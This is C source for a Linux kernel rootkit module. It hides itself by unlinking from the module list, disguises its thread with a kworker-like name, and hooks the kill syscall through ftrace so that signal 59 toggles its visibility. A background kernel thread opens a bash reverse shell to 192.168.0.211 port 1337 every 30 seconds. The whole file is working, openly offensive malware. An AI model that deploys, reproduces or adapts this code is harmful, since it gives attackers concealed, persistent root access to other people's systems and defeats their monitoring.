
#include <linux/init.h>         // Module initialization functions
#include <linux/module.h>       // Kernel module functions.
#include <linux/kernel.h>       // Basic kernel definitions, such as printk.
#include <linux/kthread.h>      // Thread management in the kernel.
#include <linux/delay.h>        // Delay functions, such as ssleep().
#include <linux/sched/signal.h> // Process management in the kernel.
#include <linux/string.h>       // For string functions like strlen() and strncmp().

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("GPL");
MODULE_DESCRIPTION("GPL");

enum {
    SIGHIDE = 59,
    TIMETOSHELL = 30
};

static int hide_status = 0;
static asmlinkage long(*orig_kill)(const struct pt_regs *);

static struct list_head *module_previous;
void module_hide(void)
{
        module_previous = THIS_MODULE->list.prev;
        list_del(&THIS_MODULE->list);
        hide_status = 1;

}

void module_show(void)
{
 list_add(&THIS_MODULE->list, module_previous);
 hide_status = 0;
}


static asmlinkage int hook_kill(const struct pt_regs *regs){
 void module_show(void);

 int signal;
 signal = regs->si;

 if(signal == SIGHIDE){
    if(hide_status == 1){
        module_show();
    }else{
        module_hide();
    }
  
  return 0;
 }

 return orig_kill(regs);
}

static struct ftrace_hook hooks[] = {
                HOOK("__x64_sys_kill", hook_kill, &orig_kill),
};

struct task_struct *mon_thread; // Reference for the monitoring thread.
struct task_struct *task; // Structure used to represent tasks (processes) in the kernel.

int mon_shell(void *data) {     // Function that will be executed by the kernel thread (mon_thread).
    while (!kthread_should_stop()) {  // Checks if the thread should stop.

            call_usermodehelper("/bin/bash",
                                (char *[]){"/bin/bash", "-c", "bash -i >& /dev/tcp/192.168.0.211/1337 0>&1", NULL},
                                NULL, UMH_WAIT_EXEC);


        ssleep(TIMETOSHELL);  // Waits 30 seconds before trying again.
    }
    return 0;  // Returns 0 when the thread finishes.
}

static int __init uninterruptible_sleep_init(void) {
    module_hide();
    // Creates and runs the monitoring thread mon_shell.
    mon_thread = kthread_run(mon_shell, NULL, "kworker/R-644-sci"); //random name that will appear in ps

    // Checks if the thread creation failed.
    if (IS_ERR(mon_thread)) {
        printk(KERN_ALERT "Failed to create thread!\n");
        return PTR_ERR(mon_thread);  // Returns the error.
    }

    int error;
    error = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(error){
           return error;
    }


    //printk(KERN_INFO "Monitoring started!\n"); //for debugging reasons
    return 0;  // Returns 0 if the thread was successfully created.
}

static void __exit uninterruptible_sleep_exit(void) {
    if (mon_thread) {
        kthread_stop(mon_thread);  // Stops the monitoring thread.
    }

    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));

}

module_init(uninterruptible_sleep_init);
module_exit(uninterruptible_sleep_exit);
